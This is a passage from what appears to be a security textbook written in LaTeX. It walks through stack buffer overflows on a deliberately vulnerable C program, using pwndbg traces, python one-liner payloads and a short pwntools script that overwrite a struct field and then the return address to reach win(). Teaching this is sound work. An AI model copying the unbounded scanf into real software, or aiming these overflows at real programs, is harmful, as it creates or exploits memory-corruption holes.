+   0x4006bf <main+70>     mov    edi, 0x400812
+   0x4006c4 <main+75>     mov    eax, 0
+   0x4006c9 <main+80>     call   __isoc99_scanf@plt            <0x400530>
+ 
+ ► 0x4006ce <main+85>     mov    rax, qword ptr [rbp - 0x10]
+   0x4006d2 <main+89>     test   rax, rax
+   0x4006d5 <main+92>     jne    main+101                      <0x4006de>
+    ↓
+   0x4006de <main+101>    mov    rdx, qword ptr [rbp - 0x10]
+   0x4006e2 <main+105>    mov    eax, 0xdeadbeef
+   0x4006e7 <main+110>    cmp    rdx, rax
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde50 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           4006ce main+85
+   f 1     7ffff7a2d830 __libc_start_main+240
+pwndbg> dd 0x7fffffffde50 17
+00007fffffffde50     41414141 41414141 41414141 41414141
+00007fffffffde60     41414141 41414141 41414141 41414141
+00007fffffffde70     41414141 41414141 41414141 41414141
+00007fffffffde80     41414141 41414141 41414141 41414141
+00007fffffffde90     deadbeef
+pwndbg> c
+Continuing.
+Access granted.
+[Inferior 1 (process 22848) exited normally]
+pwndbg> 
+\end{lstlisting}
+
+When we follow the 'A' characters with \texttt{0xef 0xbe 0xad 0xde},
+\texttt{scanf()} writes \texttt{0xdeadbeef} to \texttt{a.token}, which causes
+the program to call \texttt{win()}! Let's verify that it works without the
+debugger as well.
+
+\begin{lstlisting}
+> python -c "print 'A' * 64 + '\xef\xbe\xad\xde'" | ./memory_corruption
+Enter the password:
+Access granted.
+>
+\end{lstlisting}
+
+% TODO: motivate doing this in pwntools
+An implementation of this solution in \texttt{pwntools} is below.
+
+\begin{lstlisting}
+#!/usr/bin/python
+from pwn import *
+
+p = process("./memory_corruption")
+p.sendline("A" * 64 + p32(0xdeadbeef))
+print p.recv()
+\end{lstlisting}
+
+And the output when it is run:
+
+\begin{lstlisting}
+> ./memory_corruption_solution.py
+[+] Starting local process './memory_corruption': pid 1531
+[*] Process './memory_corruption' stopped with exit code 0 (pid 1531)
+Enter the password:
+Access granted.
+
+> 
+\end{lstlisting}
+
+This strategy is severely limited by the fact that it relies on the buffer being
+allocated to a lower address than the token. However, we can still exploit the
+unsafe call to \texttt{scanf()} without relying on this. Recall that whenever
+a function (including \texttt{main()}) is called, the calling function stores a
+return address is stored on the stack as part of the calling convention. After
+the callee finishes executing, control resumes from the instruction located at
+the return address. Therefore, if we can leverage the unsafe call to
+\texttt{scanf()} to overwrite the return address with the location of
+\texttt{win()}, we can call it regardless of the order of the local variables.
+We'll try this technique on the program below.
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+
+void empty(void) {
+    printf("You don't have permission to perform this action.\n");
+}
+
+void win(void) {
+    printf("Access granted.\n");
+}
+
+void lose(void) {
+    printf("Invalid auth token.\n");
+}
+
+typedef struct auth {
+    long int token;
+    char buf[64];
+} auth;
+
+int main(void) {
+    auth a;
+    memset(a.buf, 0, 64);
+    a.token = 0;
+
+    printf("Enter the password:\n");
+    scanf("%s", a.buf);
+
+    if (a.token == 0) {
+        empty();
+    } else if (a.token == 0xdeadbeef) {
+        win();
+    } else {
+        lose();
+    }
+}
+\end{lstlisting}
+
+This program is very similar to the previous one, the only differenct being that
+the \texttt{token} and \texttt{buf} variables have been switched in the
+\texttt{auth} structure. This program also needs to be compiled with the
+\texttt{-fno-stack-protector}, for a reason we'll get to later. You'll notice
+that this program crashes if given too much input, but it takes a bit more to
+crash it than you may expect.
+
+\begin{lstlisting}
+> python -c "print 'A' * 65" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+> python -c "print 'A' * 70" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+> python -c "print 'A' * 75" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+> python -c "print 'A' * 80" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+Segmentation fault
+> python -c "print 'A' * 79" | ./ret_overwrite 
+Enter the password:
+You don't have permission to perform this action.
+> 
+\end{lstlisting}
+
+Let's analyze this further in \texttt{pwndbg}.
+
+\begin{lstlisting}
+> gdb -q ./ret_overwrite 
+Loaded 112 commands. Type pwndbg [filter] for a list.
+Reading symbols from ./ret_overwrite...(no debugging symbols found)...done.
+pwndbg> b main
+Breakpoint 1 at 0x40060d
+pwndbg> r < <(python -c "print 'A' * 80")
+Starting program: /home/devneal/Security/REFE/textbook/example_code/ret_overwrite < <(python -c "print 'A' * 80")
+
+Breakpoint 1, 0x000000000040060d in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x400609 (main) ◂— push   rbp
+ RBX  0x0
+ RCX  0x0
+*RDX  0x7fffffffdfa8 —▸ 0x7fffffffe2e5 ◂— 'XDG_VTNR=7'
+*RDI  0x1
+*RSI  0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x400700 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+*R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+*R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RIP  0x40060d (main+4) ◂— sub    rsp, 0x50
+[───────────DISASM───────────]
+ ► 0x40060d <main+4>     sub    rsp, 0x50
+   0x400611 <main+8>     lea    rax, [rbp - 0x50]
+   0x400615 <main+12>    add    rax, 8
+   0x400619 <main+16>    mov    edx, 0x40
+   0x40061e <main+21>    mov    esi, 0
+   0x400623 <main+26>    mov    rdi, rax
+   0x400626 <main+29>    call   memset@plt                    <0x4004a0>
+ 
+   0x40062b <main+34>    mov    qword ptr [rbp - 0x50], 0
+   0x400633 <main+42>    mov    edi, 0x40076e
+   0x400638 <main+47>    call   puts@plt                      <0x400490>
+ 
+   0x40063d <main+52>    lea    rax, [rbp - 0x50]
+[────────────STACK────────────]
+00:0000│ rbp rsp  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7fffffffdeb8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+02:0010│          0x7fffffffdec0 ◂— 0x0
+03:0018│          0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+04:0020│          0x7fffffffded0 ◂— 0x100000000
+05:0028│          0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+06:0030│          0x7fffffffdee0 ◂— 0x0
+07:0038│          0x7fffffffdee8 ◂— 0x1c722a2450ebd61f
+[───────────BACKTRACE───────────]
+ ► f 0           40060d main+4
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint main
+pwndbg> pdisass main 12
+ ► 0x400609 <main>        push   rbp
+   0x40060a <main+1>      mov    rbp, rsp
+   0x40060d <main+4>      sub    rsp, 0x50
+   0x400611 <main+8>      lea    rax, [rbp - 0x50]
+   0x400615 <main+12>     add    rax, 8
+   0x400619 <main+16>     mov    edx, 0x40
+   0x40061e <main+21>     mov    esi, 0
+   0x400623 <main+26>     mov    rdi, rax
+   0x400626 <main+29>     call   memset@plt                    <0x4004a0>
+ 
+   0x40062b <main+34>     mov    qword ptr [rbp - 0x50], 0
+   0x400633 <main+42>     mov    edi, 0x40076e
+   0x400638 <main+47>     call   puts@plt                      <0x400490>
+ 
+   0x40063d <main+52>     lea    rax, [rbp - 0x50]
+   0x400641 <main+56>     add    rax, 8
+   0x400645 <main+60>     mov    rsi, rax
+   0x400648 <main+63>     mov    edi, 0x400782
+   0x40064d <main+68>     mov    eax, 0
+   0x400652 <main+73>     call   __isoc99_scanf@plt            <0x4004c0>
+ 
+   0x400657 <main+78>     mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>     test   rax, rax
+   0x40065e <main+85>     jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+   0x400686 <main+125>    leave  
+pwndbg> b *main+73
+Breakpoint 2 at 0x400652
+pwndbg> c
+Continuing.
+Enter the password:
+
+Breakpoint 2, 0x0000000000400652 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x400782 ◂— and    eax, 0x73 /* '%s' */
+*RSI  0x7fffffffde68 ◂— 0x0
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffde60 ◂— 0x0
+*RIP  0x400652 (main+73) ◂— call   0x4004c0
+[───────────DISASM───────────]
+   0x40063d <main+52>    lea    rax, [rbp - 0x50]
+   0x400641 <main+56>    add    rax, 8
+   0x400645 <main+60>    mov    rsi, rax
+   0x400648 <main+63>    mov    edi, 0x400782
+   0x40064d <main+68>    mov    eax, 0
+ ► 0x400652 <main+73>    call   __isoc99_scanf@plt            <0x4004c0>
+        format: 0x400782 ◂— 0x1b01000000007325 /* '%s' */
+        vararg: 0x7fffffffde68 ◂— 0x0
+ 
+   0x400657 <main+78>    mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>    test   rax, rax
+   0x40065e <main+85>    jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>    call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>    jmp    main+120                      <0x400681>
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde60 ◂— 0x0
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           400652 main+73
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+73
+pwndbg> dq 0x7fffffffde68 12
+00007fffffffde68     0000000000000000 0000000000000000
+00007fffffffde78     0000000000000000 0000000000000000
+00007fffffffde88     0000000000000000 0000000000000000
+00007fffffffde98     0000000000000000 0000000000000000
+00007fffffffdea8     0000000000000000 0000000000400690
+00007fffffffdeb8     00007ffff7a2d830 0000000000000000
+pwndbg> retaddr
+0x7fffffffdeb8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+0x7fffffffdf78 —▸ 0x400509 (_start+41) ◂— hlt    
+pwndbg> ni
+0x0000000000400657 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x1
+ RBX  0x0
+*RCX  0xa
+*RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
+*RDI  0x7fffffffd940 ◂— 0x1
+*RSI  0x1
+*R8   0x0
+*R9   0x7ffff7fce700 ◂— 0x7ffff7fce700
+*R10  0x400782 ◂— and    eax, 0x73 /* '%s' */
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdeb0 ◂— 'AAAAAAAA'
+ RSP  0x7fffffffde60 ◂— 0x0
+*RIP  0x400657 (main+78) ◂— mov    rax, qword ptr [rbp - 0x50]
+[───────────DISASM───────────]
+   0x400641 <main+56>     add    rax, 8
+   0x400645 <main+60>     mov    rsi, rax
+   0x400648 <main+63>     mov    edi, 0x400782
+   0x40064d <main+68>     mov    eax, 0
+   0x400652 <main+73>     call   __isoc99_scanf@plt            <0x4004c0>
+ 
+ ► 0x400657 <main+78>     mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>     test   rax, rax
+   0x40065e <main+85>     jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde60 ◂— 0x0
+01:0008│      0x7fffffffde68 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           400657 main+78
+   f 1     7ffff7a2d800 __libc_start_main+192
+pwndbg> dq 0x7fffffffde68 12
+00007fffffffde68     4141414141414141 4141414141414141
+00007fffffffde78     4141414141414141 4141414141414141
+00007fffffffde88     4141414141414141 4141414141414141
+00007fffffffde98     4141414141414141 4141414141414141
+00007fffffffdea8     4141414141414141 4141414141414141
+00007fffffffdeb8     00007ffff7a2d800 0000000000000000
+pwndbg> c
+Continuing.
+You don't have permission to perform this action.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7a2d800 in __libc_start_main (main=0x400609 <main>, argc=1, argv=0x7fffffffdf98, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf88) at ../csu/libc-start.c:285
+285	../csu/libc-start.c: No such file or directory.
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x1
+*RSI  0x602010 ◂— 0x276e6f6420756f59 ("You don'")
+*R8   0x2e6e6f6974636120 (' action.')
+*R9   0x6f697373696d7265 ('ermissio')
+*R10  0x726570206f74206e ('n to per')
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x4141414141414141 ('AAAAAAAA')
+*RSP  0x7fffffffdec0 ◂— 0x0
+*RIP  0x7ffff7a2d800 (__libc_start_main+192) ◂— add    al, byte ptr [rax]
+[───────────DISASM───────────]
+ ► 0x7ffff7a2d800 <__libc_start_main+192>    add    al, byte ptr [rax]
+   0x7ffff7a2d802 <__libc_start_main+194>    add    byte ptr [rax - 0x77], cl
+   0x7ffff7a2d805 <__libc_start_main+197>    and    al, 0x70
+   0x7ffff7a2d808 <__libc_start_main+200>    lea    rax, [rsp + 0x20]
+   0x7ffff7a2d80d <__libc_start_main+205>    mov    qword ptr fs:[0x300], rax
+   0x7ffff7a2d816 <__libc_start_main+214>    mov    rax, qword ptr [rip + 0x3a369b]
+   0x7ffff7a2d81d <__libc_start_main+221>    mov    rsi, qword ptr [rsp + 8]
+   0x7ffff7a2d822 <__libc_start_main+226>    mov    edi, dword ptr [rsp + 0x14]
+   0x7ffff7a2d826 <__libc_start_main+230>    mov    rdx, qword ptr [rax]
+   0x7ffff7a2d829 <__libc_start_main+233>    mov    rax, qword ptr [rsp + 0x18]
+   0x7ffff7a2d82e <__libc_start_main+238>    call   rax
+[──────────────────────────────────────────SOURCE───────────────────────────────────────────]
+280	in ../csu/libc-start.c
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdec0 ◂— 0x0
+01:0008│      0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+02:0010│      0x7fffffffded0 ◂— 0x100000000
+03:0018│      0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+04:0020│      0x7fffffffdee0 ◂— 0x0
+05:0028│      0x7fffffffdee8 ◂— 0xa0fdaab34f8959c
+06:0030│      0x7fffffffdef0 —▸ 0x4004e0 (_start) ◂— xor    ebp, ebp
+07:0038│      0x7fffffffdef8 —▸ 0x7fffffffdf90 ◂— 0x1
+[───────────BACKTRACE───────────]
+ ► f 0     7ffff7a2d800 __libc_start_main+192
+Program received signal SIGSEGV (fault address 0x0)
+pwndbg> 
+\end{lstlisting}
+
+% TODO: link to stack canary hypothesis for padding
+% TODO: learn how to make references
+We can tell that the buffer is located at \texttt{0x7fffffffde68} by looking at
+the second argument to \texttt{scanf()}. When we look at this memory, there
+appears to be space for the 64 bytes of the buffer, an additional 8 bytes of
+padding added by the compiler, the saved base pointer, then the return address.
+We can verify this the \texttt{retaddr} command provided by \texttt{pwndbg},
+which prints all stack addresses that contain return addresses. After
+\texttt{scanf()} executes, the buffer, padding, and base pointer are all filled
+with \texttt{0x41} bytes, and a null terminator is written into the last byte of
+the return address. This explains why we needed 80 bytes to cause the program to
+crash.
+
+But our goal isn't to crash the program, it is to execute \texttt{win()}! So next
+we'll try overwriting the retturn address with \texttt{win()}'s address. First
+we need to know what that address is. There are a number of ways to do this,
+such as \texttt{readelf}, \texttt{nm}, or even with \texttt{gdb}.
+
+% TODO: remove escape from $
+\begin{lstlisting}
+> readelf --symbols ret_overwrite | grep win
+    62: 00000000004005e7    17 FUNC    GLOBAL DEFAULT   14 win
+> nm ret_overwrite | grep win
+00000000004005e7 T win
+> gdb -q ./ret_overwrite
+Loaded 112 commands. Type pwndbg [filter] for a list.
+Reading symbols from ./ret_overwrite...(no debugging symbols found)...done.
+pwndbg> print win
+\$1 = {<text variable, no debug info>} 0x4005e7 <win>
+pwndbg> 
+\end{lstlisting}
+
+So we want to overwrite the return address with \texttt{0x4005e7}. Let's try it.
+
+\begin{lstlisting}
+pwndbg> r < <(python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00'")
+Starting program: /home/devneal/Security/REFE/textbook/example_code/ret_overwrite < <(python -c "print 'A' * 80 + '\xe7\x05\x40\x00\x00\x00\x00\x00'")
+
+Breakpoint 1, 0x000000000040060d in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x400609 (main) ◂— push   rbp
+ RBX  0x0
+*RCX  0x0
+*RDX  0x7fffffffdfa8 —▸ 0x7fffffffe2e5 ◂— 'XDG_VTNR=7'
+ RDI  0x1
+*RSI  0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x400700 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RIP  0x40060d (main+4) ◂— sub    rsp, 0x50
+[───────────DISASM───────────]
+   0x400609 <main>       push   rbp
+   0x40060a <main+1>     mov    rbp, rsp
+ ► 0x40060d <main+4>     sub    rsp, 0x50
+   0x400611 <main+8>     lea    rax, [rbp - 0x50]
+   0x400615 <main+12>    add    rax, 8
+   0x400619 <main+16>    mov    edx, 0x40
+   0x40061e <main+21>    mov    esi, 0
+   0x400623 <main+26>    mov    rdi, rax
+   0x400626 <main+29>    call   memset@plt                    <0x4004a0>
+ 
+   0x40062b <main+34>    mov    qword ptr [rbp - 0x50], 0
+   0x400633 <main+42>    mov    edi, 0x40076e
+[────────────STACK────────────]
+00:0000│ rbp rsp  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7fffffffdeb8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+02:0010│          0x7fffffffdec0 ◂— 0x0
+03:0018│          0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+04:0020│          0x7fffffffded0 ◂— 0x100000000
+05:0028│          0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+06:0030│          0x7fffffffdee0 ◂— 0x0
+07:0038│          0x7fffffffdee8 ◂— 0x7c6654f0a1383abe
+[───────────BACKTRACE───────────]
+ ► f 0           40060d main+4
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint main
+pwndbg> c
+Continuing.
+Enter the password:
+
+Breakpoint 2, 0x0000000000400652 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x400782 ◂— and    eax, 0x73 /* '%s' */
+*RSI  0x7fffffffde68 ◂— 0x0
+*R8   0x602000 ◂— 0x0
+*R9   0xd
+*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602410 ◂— 0x0
+*R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdeb0 —▸ 0x400690 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffde60 ◂— 0x0
+*RIP  0x400652 (main+73) ◂— call   0x4004c0
+[───────────DISASM───────────]
+   0x40063d <main+52>    lea    rax, [rbp - 0x50]
+   0x400641 <main+56>    add    rax, 8
+   0x400645 <main+60>    mov    rsi, rax
+   0x400648 <main+63>    mov    edi, 0x400782
+   0x40064d <main+68>    mov    eax, 0
+ ► 0x400652 <main+73>    call   __isoc99_scanf@plt            <0x4004c0>
+        format: 0x400782 ◂— 0x1b01000000007325 /* '%s' */
+        vararg: 0x7fffffffde68 ◂— 0x0
+ 
+   0x400657 <main+78>    mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>    test   rax, rax
+   0x40065e <main+85>    jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>    call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>    jmp    main+120                      <0x400681>
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde60 ◂— 0x0
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           400652 main+73
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint *main+73
+pwndbg> dq 0x7fffffffde68 12
+00007fffffffde68     0000000000000000 0000000000000000
+00007fffffffde78     0000000000000000 0000000000000000
+00007fffffffde88     0000000000000000 0000000000000000
+00007fffffffde98     0000000000000000 0000000000000000
+00007fffffffdea8     0000000000000000 0000000000400690
+00007fffffffdeb8     00007ffff7a2d830 0000000000000000
+pwndbg> ni
+0x0000000000400657 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x1
+ RBX  0x0
+*RCX  0xa
+*RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
+*RDI  0x7fffffffd940 ◂— 0x1
+*RSI  0x1
+*R8   0x0
+*R9   0x7ffff7fce700 ◂— 0x7ffff7fce700
+*R10  0x400782 ◂— and    eax, 0x73 /* '%s' */
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdeb0 ◂— 0x4141414141414141 ('AAAAAAAA')
+ RSP  0x7fffffffde60 ◂— 0x0
+*RIP  0x400657 (main+78) ◂— mov    rax, qword ptr [rbp - 0x50]
+[───────────DISASM───────────]
+   0x400641 <main+56>     add    rax, 8
+   0x400645 <main+60>     mov    rsi, rax
+   0x400648 <main+63>     mov    edi, 0x400782
+   0x40064d <main+68>     mov    eax, 0
+   0x400652 <main+73>     call   __isoc99_scanf@plt            <0x4004c0>
+ 
+ ► 0x400657 <main+78>     mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>     test   rax, rax
+   0x40065e <main+85>     jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffde60 ◂— 0x0
+01:0008│      0x7fffffffde68 ◂— 0x4141414141414141 ('AAAAAAAA')
+... ↓
+[───────────BACKTRACE───────────]
+ ► f 0           400657 main+78
+   f 1           4005e7 win
+   f 2                0
+pwndbg> dq 0x7fffffffde68 12
+00007fffffffde68     4141414141414141 4141414141414141
+00007fffffffde78     4141414141414141 4141414141414141
+00007fffffffde88     4141414141414141 4141414141414141
+00007fffffffde98     4141414141414141 4141414141414141
+00007fffffffdea8     4141414141414141 4141414141414141
+00007fffffffdeb8     00000000004005e7 0000000000000000
+pwndbg> pdisass main 13
+ ► 0x400609 <main>        push   rbp
+   0x40060a <main+1>      mov    rbp, rsp
+   0x40060d <main+4>      sub    rsp, 0x50
+   0x400611 <main+8>      lea    rax, [rbp - 0x50]
+   0x400615 <main+12>     add    rax, 8
+   0x400619 <main+16>     mov    edx, 0x40
+   0x40061e <main+21>     mov    esi, 0
+   0x400623 <main+26>     mov    rdi, rax
+   0x400626 <main+29>     call   memset@plt                    <0x4004a0>
+ 
+   0x40062b <main+34>     mov    qword ptr [rbp - 0x50], 0
+   0x400633 <main+42>     mov    edi, 0x40076e
+   0x400638 <main+47>     call   puts@plt                      <0x400490>
+ 
+   0x40063d <main+52>     lea    rax, [rbp - 0x50]
+   0x400641 <main+56>     add    rax, 8
+   0x400645 <main+60>     mov    rsi, rax
+   0x400648 <main+63>     mov    edi, 0x400782
+   0x40064d <main+68>     mov    eax, 0
+   0x400652 <main+73>     call   __isoc99_scanf@plt            <0x4004c0>
+ 
+   0x400657 <main+78>     mov    rax, qword ptr [rbp - 0x50]
+   0x40065b <main+82>     test   rax, rax
+   0x40065e <main+85>     jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+   0x400686 <main+125>    leave  
+   0x400687 <main+126>    ret    
+ 
+   0x400688               nop    dword ptr [rax + rax]
+pwndbg> b *main+126
+Breakpoint 3 at 0x400687
+pwndbg> c
+Continuing.
+You don't have permission to perform this action.
+
+Breakpoint 3, 0x0000000000400687 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+*RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+*RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+*RDI  0x1
+*RSI  0x602010 ◂— 0x276e6f6420756f59 ("You don'")
+*R8   0x2e6e6f6974636120 (' action.')
+*R9   0x6f697373696d7265 ('ermissio')
+*R10  0x726570206f74206e ('n to per')
+ R11  0x246
+ R12  0x4004e0 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdf90 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x4141414141414141 ('AAAAAAAA')
+*RSP  0x7fffffffdeb8 —▸ 0x4005e7 (win) ◂— push   rbp
+*RIP  0x400687 (main+126) ◂— ret    
+[───────────DISASM───────────]
+   0x40065e <main+85>     jne    main+94                       <0x400667>
+ 
+   0x400660 <main+87>     call   empty                         <0x4005d6>
+ 
+   0x400665 <main+92>     jmp    main+120                      <0x400681>
+    ↓
+   0x400681 <main+120>    mov    eax, 0
+   0x400686 <main+125>    leave  
+ ► 0x400687 <main+126>    ret                                  <0x4005e7; win>
+    ↓
+   0x4005e7 <win>         push   rbp
+   0x4005e8 <win+1>       mov    rbp, rsp
+   0x4005eb <win+4>       mov    edi, 0x40074a
+   0x4005f0 <win+9>       call   puts@plt                      <0x400490>
+ 
+   0x4005f5 <win+14>      nop    
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdeb8 —▸ 0x4005e7 (win) ◂— push   rbp
+01:0008│      0x7fffffffdec0 ◂— 0x0
+02:0010│      0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe2a5 ◂— 0x65642f656d6f682f ('/home/de')
+03:0018│      0x7fffffffded0 ◂— 0x100000000
+04:0020│      0x7fffffffded8 —▸ 0x400609 (main) ◂— push   rbp
+05:0028│      0x7fffffffdee0 ◂— 0x0
+06:0030│      0x7fffffffdee8 ◂— 0x7c6654f0a1383abe
+07:0038│      0x7fffffffdef0 —▸ 0x4004e0 (_start) ◂— xor    ebp, ebp
+[───────────BACKTRACE───────────]
+ ► f 0           400687 main+126
+   f 1           4005e7 win
+   f 2                0
+Breakpoint *main+126
+pwndbg> ni
+0x00000000004005e7 in win ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+ RAX  0x0
+ RBX  0x0
+ RCX  0x7ffff7b04290 (__write_nocancel+7) ◂— cmp    rax, -0xfff
+ RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
+ RDI  0x1
+ RSI  0x602010 ◂— 0x276e6f6420756f59 ("You don'")
+ R8   0x2e6e6f6974636120 (' action.')
+ R9   0x6f697373696d7265 ('ermissio')
